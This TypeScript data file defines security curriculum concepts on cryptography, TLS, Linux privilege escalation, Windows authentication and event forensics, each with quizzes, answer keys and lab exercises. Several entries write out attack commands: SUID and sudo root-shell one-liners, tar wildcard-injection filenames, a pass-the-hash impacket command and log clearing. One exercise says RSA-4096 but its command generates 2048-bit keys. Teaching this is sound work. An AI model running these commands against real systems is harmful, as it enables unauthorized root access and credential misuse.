import { MasterConcept } from './masterCurriculumGraph';

export const CONCEPTS_PART3: Record<string, MasterConcept> = {
  // LEVEL 7: CRYPTOGRAPHY FUNDAMENTALS
  'c7_symmetric_asymmetric': {
    id: 'c7_symmetric_asymmetric',
    level: 7,
    title: 'Symmetric vs Asymmetric Cryptography & Key Exchange',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c3_encoding_encrypt_hash'],
    nextConcepts: ['c7_tls_handshake', 'c7_hashing_signatures'],
    relatedConcepts: ['c3_encoding_encrypt_hash'],
    definition: 'Symmetric cryptography uses a single shared secret key for encryption and decryption (AES, ChaCha20); Asymmetric cryptography uses a mathematically linked Public-Private key pair (RSA, ECC).',
    whyItMatters: 'Modern secure communication (HTTPS, SSH, VPNs, Signal) relies on hybrid cryptography: asymmetric key exchange to share a symmetric session key for high-speed data encryption.',
    mentalModel: 'Asymmetric = A public mailbox with an open slot where anyone can drop letters in (Public Key), but only the homeowner holds the physical key to unlock and read the mail (Private Key). Symmetric = A physical padlock where both parties must possess the identical brass key.',
    coreExplanation: 'Symmetric ciphers (e.g. AES-GCM) are fast and encrypt bulk data. Asymmetric ciphers (e.g. RSA-4096, ECDH Curve25519) solve key distribution without requiring pre-shared secrets. Diffie-Hellman Key Exchange allows two parties to establish a shared secret over an insecure channel.',
    visualExplanation: {
      type: 'diagram',
      title: 'Hybrid Encryption in Modern TLS',
      content: '1. [Client] <--- (Server Public Key in Cert) --- [Server]\n2. [Client] & [Server] compute shared secret via ECDH Key Exchange\n3. [Client] <== (High-speed AES-256-GCM symmetric stream) ==> [Server]'
    },
    example: 'SSH uses `id_rsa.pub` (public key placed in `~/.ssh/authorized_keys` on server) and `id_rsa` (private key kept strictly on user client).',
    practicalExercise: {
      task: 'Generate an RSA-4096 key pair and encrypt a file using OpenSSL.',
      commandOrPayload: 'openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048 && openssl rsa -in private.pem -pubout -out public.pem',
      expectedOutcome: 'Generates PEM-encoded RSA private and public key files.',
      labRoute: '/crypto-lab'
    },
    commonMistakes: [
      'Sharing or committing the private key to a public Git repository.',
      'Using ECB (Electronic Codebook) mode in symmetric encryption, which leaks underlying plaintext patterns (the famous ECB Penguin).'
    ],
    securityRelevance: 'Cryptographic weaknesses (hardcoded keys, obsolete ciphers like DES/RC4) allow adversaries to decrypt captured network traffic retroactively.',
    offensivePerspective: 'Attackers search codebases for hardcoded cryptographic keys and utilize GPU rigs (Hashcat) to crack weakly derived keys.',
    defensivePerspective: 'Cryptographic engineers enforce AES-GCM (Authenticated Encryption with Associated Data) and Elliptic Curve Diffie-Hellman (ECDHE) for Perfect Forward Secrecy (PFS).',
    assessment: {
      question: 'Why do modern secure protocols use hybrid encryption combining both asymmetric and symmetric cryptography?',
      options: [
        'Because symmetric encryption cannot encrypt binary files',
        'Because asymmetric encryption solves the key exchange problem, while symmetric encryption provides high-speed bulk data encryption',
        'Because asymmetric encryption was banned by NIST in 2020',
        'Because symmetric encryption requires an internet connection to work'
      ],
      correctIndex: 1,
      explanation: 'Asymmetric cryptography allows secure key exchange across public networks, after which high-throughput symmetric ciphers encrypt the actual session stream efficiently.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Security Architect', 'Cryptographer', 'Cloud Security Engineer', 'AppSec Specialist']
  },

  'c7_tls_handshake': {
    id: 'c7_tls_handshake',
    level: 7,
    title: 'TLS 1.3 Handshake & Transport Layer Security',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c7_symmetric_asymmetric', 'c3_pki_mfa'],
    nextConcepts: ['c9_ntlm_kerberos_basics', 'c10_ad_architecture'],
    relatedConcepts: ['c3_pki_mfa', 'c7_symmetric_asymmetric'],
    definition: 'The cryptographic protocol securing internet communications, providing confidentiality, data integrity, and server/client authentication.',
    whyItMatters: 'TLS secures HTTPS, protecting credentials and private data against Man-in-the-Middle (MITM) wiretapping across public Wi-Fi and the internet.',
    mentalModel: 'Sealing your letter inside a tamper-proof titanium lockbox before mailing it, with a wax seal that proves it came from the verified sender.',
    coreExplanation: 'In TLS 1.3, handshake latency is reduced to 1-RTT: 1) ClientHello (supported cipher suites, key shares, SNI), 2) ServerHello (selected cipher, server key share, X.509 certificate chain, Finished message), 3) Client verifies certificate chain against trusted Root CAs, 4) Encrypted application data exchange begins.',
    visualExplanation: {
      type: 'flow',
      title: 'TLS 1.3 1-RTT Handshake Lifecycle',
      content: '[Client] --- (ClientHello + KeyShare) ---> [Server]\n[Client] <--- (ServerHello + KeyShare + EncryptedExtensions + Certificate + Finished) --- [Server]\n[=== Shared Secret Derived via ECDHE ===]\n[Client] <== (Encrypted HTTP Application Data) ==> [Server]'
    },
    example: 'Inspecting a connection with `curl -v https://google.com` shows TLS version (TLSv1.3), cipher suite (TLS_AES_256_GCM_SHA384), and certificate validation.',
    practicalExercise: {
      task: 'Audit SSL/TLS cipher suites of a remote server and check for deprecated ciphers.',
      commandOrPayload: 'openssl s_client -connect scanme.nmap.org:443 -tls1_3',
      expectedOutcome: 'Confirms TLS 1.3 negotiation with ECDHE key exchange.',
      labRoute: '/crypto-lab'
    },
    commonMistakes: [
      'Supporting obsolete protocol versions (SSLv3, TLS 1.0, TLS 1.1) vulnerable to downgrade attacks (POODLE, BEAST).',
      'Disabling certificate validation in scripts (`verify=False` or `curl -k`) in production environments.'
    ],
    securityRelevance: 'Improper certificate validation allows attackers on the same network to intercept, inspect, and modify encrypted traffic in transit.',
    offensivePerspective: 'Pentesters use tools like `sslstrip` or set up rogue Wi-Fi APs to attempt TLS downgrade attacks and intercept unencrypted credentials.',
    defensivePerspective: 'Engineers enforce HTTP Strict Transport Security (`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`) to prevent downgrade attacks.',
    assessment: {
      question: 'What major performance and security advantage does TLS 1.3 introduce over TLS 1.2?',
      options: [
        'It eliminates the need for digital certificates completely',
        'It reduces the handshake round trips to a single 1-RTT exchange and removes legacy, insecure cipher suites like RC4 and CBC mode',
        'It converts all TCP traffic into UDP automatically',
        'It allows plaintext transmission for faster downloads'
      ],
      correctIndex: 1,
      explanation: 'TLS 1.3 mandates a 1-RTT handshake for reduced latency and completely removes legacy insecure cryptographic algorithms (MD5, SHA-1, RC4, DES, CBC ciphers).'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Network Security Engineer', 'SOC Analyst', 'Security Architect']
  },

  'c7_hashing_signatures': {
    id: 'c7_hashing_signatures',
    level: 7,
    title: 'Cryptographic Hashing, HMAC & Digital Signatures',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c3_encoding_encrypt_hash'],
    nextConcepts: ['c14_static_analysis_pe', 'c13_chain_of_custody'],
    relatedConcepts: ['c3_encoding_encrypt_hash'],
    definition: 'Mathematical primitives for verifying data integrity and authenticity: Collision-resistant hash functions (SHA-256, SHA-3), Hash-based Message Authentication Codes (HMAC), and Digital Signatures (RSA/ECDSA signing).',
    whyItMatters: 'Digital signatures prove non-repudiation and software authenticity (preventing malware tampering during updates); hashes are the foundational artifact ID in DFIR.',
    mentalModel: 'A digital signature is a notarized seal: You hash the document to a small fingerprint, then sign that fingerprint with your private key. Anyone with your public key can verify nobody altered a single letter.',
    coreExplanation: 'A cryptographic hash must satisfy: 1) Determinism, 2) Pre-image resistance (one-way), 3) Second pre-image resistance, 4) Collision resistance. HMAC combines a secret key with a hash function to authenticate messages. Digital signatures encrypt the hash digest with the sender\'s private key.',
    visualExplanation: {
      type: 'flow',
      title: 'Digital Signature Creation & Verification',
      content: 'Signing:   [Message] -> (SHA-256 Hash) -> [Digest] + [Sender Private Key] -> [Digital Signature]\nVerify:    [Message] -> (SHA-256 Hash) -> [Digest A]\n           [Digital Signature] + [Sender Public Key] -> [Digest B]\n           If Digest A == Digest B ===> (VALID & TAMPER-FREE)'
    },
    example: 'Verifying an operating system ISO: `sha256sum ubuntu-24.04.iso` matches the official published SHA-256 hash string exactly.',
    practicalExercise: {
      task: 'Sign a text message with an RSA private key and verify it using the public key.',
      commandOrPayload: 'echo "Authorized Transfer $10,000" > msg.txt && openssl dgst -sha256 -sign private.pem -out msg.sig msg.txt && openssl dgst -sha256 -verify public.pem -signature msg.sig msg.txt',
      expectedOutcome: 'Outputs "Verified OK", confirming message integrity and authenticity.',
      labRoute: '/crypto-lab'
    },
    commonMistakes: [
      'Using broken hash functions (MD5, SHA-1) for digital signatures where collision attacks have been practically demonstrated.',
      'Assuming a hash provides confidentiality (hashes leak whether two inputs are identical unless salted).'
    ],
    securityRelevance: 'Adversaries forge unsigned software updates or exploit weak signature validation to deploy trojanized binaries (SolarWinds supply chain attack).',
    offensivePerspective: 'Attackers find hash collision weaknesses or forge HMAC signatures when hardcoded secret keys are discovered in client-side code.',
    defensivePerspective: 'Security teams enforce Code Signing on all production binaries and mandate Authenticode / driver signature enforcement.',
    assessment: {
      question: 'How does a recipient verify a digital signature attached to a software download?',
      options: [
        'By decrypting the entire software binary using their own private key',
        'By hashing the software and comparing it with the decrypted signature using the author\'s public key',
        'By asking the Certificate Authority to email a new password',
        'By converting the file into Base64 format'
      ],
      correctIndex: 1,
      explanation: 'The recipient hashes the file and decrypts the signature using the sender\'s public key; if the calculated hash matches the decrypted hash, the file is authentic.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['DFIR Analyst', 'Malware Analyst', 'Security Engineer', 'Cryptographer']
  },

  // LEVEL 8: LINUX SECURITY & PRIVESC
  'c8_suid_capabilities': {
    id: 'c8_suid_capabilities',
    level: 8,
    title: 'Linux Privilege Escalation: SUID, SGID & Capabilities',
    difficulty: 'ADVANCED',
    prerequisites: ['c1_linux_fs_perms', 'c1_process_services'],
    nextConcepts: ['c8_cron_path_hijack', 'c8_linux_privesc_methodology'],
    relatedConcepts: ['c1_linux_fs_perms'],
    definition: 'Special Linux file permission bits (SUID - 4000, SGID - 2000) that execute binaries with the privileges of the file owner (often root), and granular Linux POSIX Capabilities (`setcap`/`getcap`).',
    whyItMatters: 'SUID misconfigurations (e.g. SUID on `find`, `vim`, `bash`, `python`) represent the most classic and reliable local privilege escalation vectors on Linux systems.',
    mentalModel: 'A special badge attached to a specific tool: Anyone who picks up this wrench (executes the SUID binary) temporarily gains master electrician (root) powers while holding it.',
    coreExplanation: 'When an executable has the SUID bit set (`-rwsr-xr-x`), the kernel assigns the process an Effective User ID (EUID) of the file owner (root) rather than the real user (RUID). Linux Capabilities slice root privileges into granular units (e.g. `cap_setuid`, `cap_net_raw`, `cap_sys_admin`). GTFOBins catalogues SUID exploitation payloads.',
    visualExplanation: {
      type: 'table',
      title: 'SUID Special Bits & Octal Representation',
      content: 'Bit Type | Octal Value | Symbol | Effect on Execution\nSUID | 4000 | -rwsr-xr-x | Process runs with EUID of File Owner (e.g. root)\nSGID | 2000 | -rwxr-sr-x | Process runs with EGID of File Group\nSticky | 1000 | drwxrwxrwt | Only file owner can delete files in directory (/tmp)'
    },
    example: 'If `/usr/bin/python3` has SUID root, running `python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'` drops into an interactive root root-shell.',
    practicalExercise: {
      task: 'Locate all SUID binaries on the system and identify privilege escalation opportunities in the Linux Lab.',
      commandOrPayload: 'find / -perm -u=s -type f 2>/dev/null',
      expectedOutcome: 'Lists all SUID executables (e.g. `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/pkexec`).',
      labRoute: '/linux-lab'
    },
    commonMistakes: [
      'Granting SUID permissions to scripting language interpreters or compilers (`python`, `perl`, `gcc`, `bash`).',
      'Forgetting that shell scripts (`#!/bin/bash`) ignore the SUID bit on modern Linux kernels for security reasons.'
    ],
    securityRelevance: 'Legitimate SUID binaries (like `passwd`) allow users to write to `/etc/shadow`; vulnerable SUID binaries (like CVE-2021-4034 Pkit/Polkit) allow instant root compromise.',
    offensivePerspective: 'Attackers check GTFOBins against all discovered SUID binaries and capabilities (`getcap -r / 2>/dev/null`) to escalate privileges.',
    defensivePerspective: 'System administrators audit SUID binaries periodically (`aide`, `tripwire`) and mount partition volumes like `/tmp` and `/home` with the `nosuid` mount option.',
    assessment: {
      question: 'What find command syntax locates all files with the SUID bit enabled across the entire Linux filesystem?',
      options: [
        'find / -perm -u=s -type f 2>/dev/null',
        'find / -name "root" -type d',
        'find / -size +100M -perm 777',
        'find / -group admin -exec suid'
      ],
      correctIndex: 0,
      explanation: '`find / -perm -u=s -type f 2>/dev/null` searches all paths for files (`-type f`) matching user SUID bit (`-perm -u=s`), silencing permission denied errors.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'Linux Administrator', 'Security Engineer']
  },

  'c8_cron_path_hijack': {
    id: 'c8_cron_path_hijack',
    level: 8,
    title: 'Cron Jobs, Wildcard Injection & PATH Hijacking',
    difficulty: 'ADVANCED',
    prerequisites: ['c1_linux_fs_perms', 'c1_process_services'],
    nextConcepts: ['c8_linux_privesc_methodology'],
    relatedConcepts: ['c1_linux_fs_perms'],
    definition: 'Exploiting automated scheduled tasks (cron jobs running as root), relative binary paths (`PATH` environment variable manipulation), and command wildcard expansion (`*` injection).',
    whyItMatters: 'System administrators frequently create automated backup scripts running as root with unquoted paths or insecure file permissions, creating easy escalation paths.',
    mentalModel: 'A supervisor who walks into the room every hour and executes the instructions written on a specific whiteboard: If the whiteboard has no lock (world-writable), you write "Promote me to CEO".',
    coreExplanation: 'If a root cron job runs `/opt/scripts/backup.sh` and `backup.sh` is world-writable, any user can append a reverse shell. If a script executes `tar czf /tmp/backup.tar.gz *`, an attacker creates files named `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` to trigger wildcard command injection.',
    visualExplanation: {
      type: 'flow',
      title: 'Cron Job Privilege Escalation Attack Flow',
      content: '[Root Cron: * * * * * root /opt/backup.sh]\n       ↓\n[Attacker discovers /opt/backup.sh is chmod 777 (world-writable)]\n       ↓\n[Attacker appends: "chmod +s /bin/bash" to /opt/backup.sh]\n       ↓\n[Cron executes at next minute tick as UID 0] -> [/bin/bash becomes SUID root]'
    },
    example: 'PATH Hijacking: If a root script calls `service apache2 restart` without an absolute path (`/usr/sbin/service`), an attacker prepends `/tmp` to root\'s PATH and creates a malicious `/tmp/service` script.',
    practicalExercise: {
      task: 'Inspect system cron tabs and world-writable scheduled tasks in the Linux Lab.',
      commandOrPayload: 'cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -v "^#"',
      expectedOutcome: 'Reveals scheduled jobs, execution cadences, and target script paths.',
      labRoute: '/linux-lab'
    },
    commonMistakes: [
      'Using relative executable paths (e.g. `python backup.py` instead of `/usr/bin/python3 /opt/backup.py`) in system maintenance scripts.',
      'Using wildcards (`tar *`, `chown *`) in scripts running with elevated privileges.'
    ],
    securityRelevance: 'Scheduled task abuse is recognized as MITRE ATT&CK T1053.003 (Scheduled Task/Job: Cron).',
    offensivePerspective: 'Pentesters use `pspy` (unprivileged Linux process snooper) to capture root cron executions in real-time without needing root access.',
    defensivePerspective: 'Defenders enforce strict permissions on `/etc/crontab` and `/var/spool/cron`, mandate absolute paths in all scripts, and monitor cron modification events.',
    assessment: {
      question: 'Why is using `tar *` inside an automated root maintenance script dangerous from a security perspective?',
      options: [
        'Because tar cannot compress files larger than 2GB',
        'Because filenames matching tar command-line flags (e.g. --checkpoint-action) will be interpreted as command arguments rather than filenames',
        'Because tar automatically deletes all files after compression',
        'Because tar only runs on Windows systems'
      ],
      correctIndex: 1,
      explanation: 'Wildcard expansion passes all filenames in the directory as command arguments; filenames crafted as command flags (wildcard injection) trigger arbitrary command execution.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'Linux Administrator', 'Security Auditor']
  },

  'c8_linux_privesc_methodology': {
    id: 'c8_linux_privesc_methodology',
    level: 8,
    title: 'Comprehensive Linux Privilege Escalation Methodology',
    difficulty: 'ADVANCED',
    prerequisites: ['c8_suid_capabilities', 'c8_cron_path_hijack'],
    nextConcepts: ['c15_redteam_methodology'],
    relatedConcepts: ['c8_suid_capabilities', 'c8_cron_path_hijack'],
    definition: 'The systematic process of escalating from an initial unprivileged foothold (`www-data`, standard user) to full administrative `root` (UID 0) control on a Linux system.',
    whyItMatters: 'Achieving initial access to a web server or container is only step one; completing the assessment or mission requires privilege escalation to capture sensitive artifacts.',
    mentalModel: 'A systematic property inspection checklist: Check the locks on the doors (sudo/permissions) -> Check the basement blueprints (kernel version) -> Check the scheduled cleaners (cron) -> Check the hidden keys (plaintext configs).',
    coreExplanation: 'Methodology sequence: 1) System Info (`uname -a`, OS version, kernel exploits), 2) User & Sudo permissions (`id`, `sudo -l`), 3) SUID/Capabilities, 4) Scheduled Jobs (`crontab`, systemd timers), 5) Network & Internal Listening Ports (`ss -tulpn`), 6) Readable Configs & History files (`.bash_history`, `/var/www/html/wp-config.php`), 7) Automated Enumeration (LinPEAS).',
    visualExplanation: {
      type: 'flow',
      title: 'Linux PrivEsc Systematic Triage Hierarchy',
      content: '[1. Sudo Rules (sudo -l)]\n       ↓ (if none)\n[2. SUID / Capabilities (find -perm -u=s / getcap)]\n       ↓ (if none)\n[3. Cron Jobs & Timers (crontab, pspy)]\n       ↓ (if none)\n[4. Writable Configs & Stored Creds (/etc, .bash_history, /var/www)]\n       ↓ (if none)\n[5. Internal Ports & Local Services (ss -tulpn)]\n       ↓ (if none)\n[6. Kernel Exploits (Dirty Pipe, Dirty COW - Last Resort)]'
    },
    example: 'Running `sudo -l` reveals `(root) NOPASSWD: /usr/bin/find`. Checking GTFOBins reveals `sudo find . -exec /bin/sh \\; -quit`, yielding an instant root shell.',
    practicalExercise: {
      task: 'Perform full privilege escalation enumeration against the Linux Target Lab and capture the root flag.',
      commandOrPayload: 'sudo -l && uname -r && ss -tulpn',
      expectedOutcome: 'Identifies unconstrained sudo privilege or unauthenticated local database service.',
      labRoute: '/linux-lab'
    },
    commonMistakes: [
      'Jumping straight to compiling unstable kernel exploits (Dirty COW) and crashing production servers when simple misconfigurations exist.',
      'Failing to check for cleartext database passwords inside web application configuration files.'
    ],
    securityRelevance: 'A secure system enforces least privilege so that even if a web application is compromised, the attacker remains trapped in a restricted unprivileged account.',
    offensivePerspective: 'Pentesters use automated scripts (LinPEAS) to highlight misconfigurations and chain multiple minor flaws into full root takeover.',
    defensivePerspective: 'Defenders run vulnerability scanners, harden sudoers configurations, enforce AppArmor/SELinux mandatory access controls, and patch kernels promptly.',
    assessment: {
      question: 'What is the very first and most reliable command an attacker checks upon landing on a Linux target shell?',
      options: ['sudo -l', 'rm -rf /', 'cat /dev/urandom', 'traceroute 8.8.8.8'],
      correctIndex: 0,
      explanation: '`sudo -l` lists all commands the current user is authorized to run via sudo, frequently revealing passwordless root execution rules.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'Red Team Operator', 'Linux Security Engineer']
  },

  // LEVEL 9: WINDOWS SECURITY & FORENSICS
  'c9_windows_auth_tokens': {
    id: 'c9_windows_auth_tokens',
    level: 9,
    title: 'Windows Architecture: LSASS, Tokens & SAM Database',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c1_windows_registry'],
    nextConcepts: ['c9_ntlm_kerberos_basics', 'c10_ad_architecture'],
    relatedConcepts: ['c1_windows_registry'],
    definition: 'Core Windows security subsystems: Local Security Authority Subsystem Service (LSASS.exe), Security Accounts Manager (SAM registry hive), and Access Tokens (Primary and Impersonation).',
    whyItMatters: 'Dumping LSASS memory or stealing Windows access tokens allows attackers to elevate to NT AUTHORITY\\SYSTEM and move laterally across enterprise workstations.',
    mentalModel: 'LSASS is the security desk guard inside a corporate building holding a master key ring; Access Tokens are the VIP electronic badges clipped to employee shirts indicating their clearance level.',
    coreExplanation: 'Local user credentials reside in the SAM database (`C:\\Windows\\System32\\config\\SAM`) encrypted with the SYSTEM bootkey. LSASS manages authentication and caches plaintext credentials, NTLM hashes, and Kerberos tickets in RAM. Access Tokens (Primary vs Impersonation) represent user security contexts and group SIDs.',
    visualExplanation: {
      type: 'diagram',
      title: 'Windows Security Subsystems Architecture',
      content: '[User Login Request] -> [Winlogon.exe] -> [LSASS.exe]\n                                              ├── Validates against [SAM Hive / Active Directory]\n                                              ├── Caches Hashes/Tickets in RAM\n                                              └── Generates [Access Token (SID, Privileges, Group Memberships)]'
    },
    example: 'Running `whoami /priv` reveals enabled token privileges like `SeImpersonatePrivilege` or `SeBackupPrivilege`, which can be weaponized for instant SYSTEM escalation.',
    practicalExercise: {
      task: 'Enumerate enabled Windows privileges and token groups in the Windows Lab.',
      commandOrPayload: 'whoami /priv /groups',
      expectedOutcome: 'Lists all Assigned Privileges (e.g. SeChangeNotifyPrivilege, SeDebugPrivilege).',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Assuming standard users can directly open and read `C:\\Windows\\System32\\config\\SAM` while Windows is running (the file is locked by the OS kernel).',
      'Confusing local SAM authentication with Active Directory domain authentication.'
    ],
    securityRelevance: '`SeImpersonatePrivilege` on service accounts (e.g. IIS `IIS_IUSRS` or MSSQL) is exploited via Potato exploits (JuicyPotato, PrintSpoofer, GodPotato) to achieve SYSTEM.',
    offensivePerspective: 'Pentesters use Mimikatz or `procdump` to extract password hashes directly from LSASS process memory.',
    defensivePerspective: 'Defenders enable LSA Protection (RunAsPPL), Credential Guard (virtualization-based security), and monitor LSASS handle access (Sysmon Event ID 10).',
    assessment: {
      question: 'Which specific Windows user privilege is famously weaponized by "Potato" exploits (PrintSpoofer, GodPotato) to escalate from a service account to NT AUTHORITY\\SYSTEM?',
      options: ['SeChangeNotifyPrivilege', 'SeImpersonatePrivilege', 'SeShutdownPrivilege', 'SeTimeZonePrivilege'],
      correctIndex: 1,
      explanation: '`SeImpersonatePrivilege` allows a process to impersonate any client security token it can coerce into authenticating to it (e.g. via Named Pipes or RPC).'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'SOC Analyst', 'Windows Security Engineer']
  },

  'c9_ntlm_kerberos_basics': {
    id: 'c9_ntlm_kerberos_basics',
    level: 9,
    title: 'NTLM Challenge-Response vs Kerberos Authentication',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c9_windows_auth_tokens', 'c7_symmetric_asymmetric'],
    nextConcepts: ['c10_ad_architecture', 'c10_kerberos_attacks'],
    relatedConcepts: ['c10_ad_architecture'],
    definition: 'Windows authentication protocols: Legacy NTLM (3-way challenge-response: Negotiate, Challenge, Authenticate) and Kerberos (Ticket-Granting Service ticket-based symmetric authentication).',
    whyItMatters: 'NTLM is vulnerable to Pass-the-Hash (PtH) and NTLM Relay attacks; Kerberos is the backbone of Active Directory enterprise identity.',
    mentalModel: 'NTLM is writing a secret code on a piece of paper and showing you know the handshake; Kerberos is buying an amusement park ticket (TGT) at the main gate, which you exchange at individual ride booths for ride passes (TGS).',
    coreExplanation: 'NTLM uses MD4 password hashes. In NTLM challenge-response, the client does not send the password; it encrypts a server nonce challenge with its NTLM hash. Because the hash acts as the equivalent of a password, attackers with the hash can authenticate directly (Pass-the-Hash). Kerberos uses Port 88 and Ticket Granting Tickets (TGT).',
    visualExplanation: {
      type: 'flow',
      title: 'NTLM vs Kerberos Architecture Comparison',
      content: 'NTLM:     [Client] <--(Server Challenge Nonce)-- [Server] --> (Client responds with Response encrypted with NTLM Hash)\nKerberos: [Client] ---> (Requests TGT with Timestamp encrypted by User Key) ---> [KDC / Domain Controller :88]\n          [Client] <--- (Returns TGT encrypted by krbtgt Key) <--- [KDC]'
    },
    example: 'Using `psexec.py` or `wmiexec.py` with `-hashes :329153f560eb329c0e1deea55e88a1e9` authenticates over SMB without ever knowing the cleartext password.',
    practicalExercise: {
      task: 'Perform an authorized Pass-the-Hash authentication test against the Windows Lab target.',
      commandOrPayload: 'impacket-wmiexec -hashes :aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9 Administrator@10.10.10.15',
      expectedOutcome: 'Spawns an interactive administrative command shell using only the NTLM hash.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Assuming NTLM hashing uses a salt (NTLM hashes are unsalted MD4 digests of the UTF-16LE password; identical passwords yield identical hashes).',
      'Believing disabling NTLM on one server protects the entire domain if NTLM fallback remains enabled globally.'
    ],
    securityRelevance: 'NTLM Relay attacks (coerced authentication via PetitPotam or PrinterBug to AD CS) frequently yield instant Domain Admin rights.',
    offensivePerspective: 'Red teams capture NetNTLMv2 hashes on local networks using Responder via LLMNR/NBT-NS spoofing and relay them to unencrypted SMB/LDAP endpoints.',
    defensivePerspective: 'Enterprises disable LLMNR/NBT-NS, enable SMB Signing globally, disable NTLM via GPO, and mandate EPA (Extended Protection for Authentication).',
    assessment: {
      question: 'Why does the Pass-the-Hash (PtH) attack work against NTLM authentication without knowing the user\'s cleartext password?',
      options: [
        'Because NTLM converts all passwords into Base64 format',
        'Because the NTLM challenge-response protocol uses the raw NTLM password hash itself as the cryptographic key to calculate the response',
        'Because Windows ignores passwords for accounts created after 2015',
        'Because NTLM transmits the password over plaintext DNS'
      ],
      correctIndex: 1,
      explanation: 'In the NTLM protocol, the password hash IS the secret key. Therefore, possessing the hash is cryptographically identical to possessing the password.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'Active Directory Admin', 'SOC Analyst', 'Threat Hunter']
  },

  'c9_windows_event_forensics': {
    id: 'c9_windows_event_forensics',
    level: 9,
    title: 'Windows Event Log Forensics & Threat Telemetry',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c1_windows_registry', 'c1_pipes_redirection'],
    nextConcepts: ['c11_siem_architecture', 'c11_soc_alert_triage'],
    relatedConcepts: ['c1_windows_registry'],
    definition: 'Analyzing Windows Security, System, and Sysmon event logs to reconstruct adversary attack chains, credential theft, and lateral movement.',
    whyItMatters: 'Windows Event Logs are the primary forensic evidence source for investigating enterprise breaches, ransomware deployments, and insider threats.',
    mentalModel: 'A bank\'s digital surveillance system logging every badge swipe, door opening, vault access, and alarm trigger with microsecond timestamps.',
    coreExplanation: 'Key Security Event IDs: 4624 (Successful Logon), 4625 (Failed Logon), 4672 (Special Privileges Assigned / Admin Logon), 4688 (Process Creation with Command Line), 4720 (User Account Created), 7045 (Service Installed). Sysmon adds deep telemetry: Event ID 1 (Process Creation), 3 (Network Connection), 10 (ProcessAccess / LSASS injection).',
    visualExplanation: {
      type: 'table',
      title: 'Critical Windows Security & Sysmon Event IDs',
      content: 'Event ID | Log Channel | Meaning & Security Relevance\n4624 | Security | Successful Logon (LogonType 2=Interactive, 3=Network, 10=RDP)\n4625 | Security | Failed Logon (Brute-force / Password Spray indicator)\n4688 | Security | New Process Created (Inspect ProcessCommandLine for LOLBins)\n4720 | Security | User Account Created (Attacker Persistence / Backdoor account)\n1    | Sysmon   | Process Create (Includes ParentImage, Hashes, CommandLine)\n10   | Sysmon   | ProcessAccess (Detects Mimikatz targeting lsass.exe)'
    },
    example: 'Event 4624 with `LogonType: 3` followed immediately by Event 7045 (Service Installed: `PSEXESVC`) indicates lateral movement via PsExec.',
    practicalExercise: {
      task: 'Filter Windows Security event logs for failed login bursts using PowerShell in the SOC Lab.',
      commandOrPayload: 'Get-WinEvent -FilterHashtable @{LogName=\'Security\'; Id=4625} -MaxEvents 10 | Select TimeCreated, Message',
      expectedOutcome: 'Extracts timestamp, target username, and failure reason status codes (0xC000006A).',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Failing to enable Process Command-Line Auditing (by default, Event 4688 logs only the process name, hiding the malicious script parameters).',
      'Ignoring LogonType values (LogonType 10 specifically indicates Remote Desktop RDP access).'
    ],
    securityRelevance: 'Adversaries attempt to clear event logs (`wevtutil cl Security` -> Event ID 1102), which is itself a high-fidelity indicator of compromise.',
    offensivePerspective: 'Attackers evade log detection by unhooking user-mode APIs, executing via COM objects, or disabling Sysmon drivers.',
    defensivePerspective: 'SOC engineers forward Windows Event logs in real-time to centralized SIEMs (Splunk, Elastic) so evidence is preserved even if local logs are cleared.',
    assessment: {
      question: 'Which Windows LogonType in Event ID 4624 indicates a remote interactive connection via Remote Desktop (RDP)?',
      options: ['LogonType 2 (Interactive)', 'LogonType 3 (Network)', 'LogonType 5 (Service)', 'LogonType 10 (RemoteInteractive / RDP)'],
      correctIndex: 3,
      explanation: 'LogonType 10 signifies RemoteInteractive, generated when a user logs on remotely using Terminal Services, Remote Desktop (RDP), or RemoteApp.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['SOC Analyst', 'DFIR Analyst', 'Threat Hunter', 'Incident Responder']
  },

  // LEVEL 10: ACTIVE DIRECTORY
  'c10_ad_architecture': {
    id: 'c10_ad_architecture',
    level: 10,
    title: 'Active Directory Architecture: Forests, Domains, Trees & Trusts',
    difficulty: 'ADVANCED',
    prerequisites: ['c9_windows_auth_tokens', 'c9_ntlm_kerberos_basics'],
    nextConcepts: ['c10_kerberos_attacks', 'c10_ad_hardening_detection'],
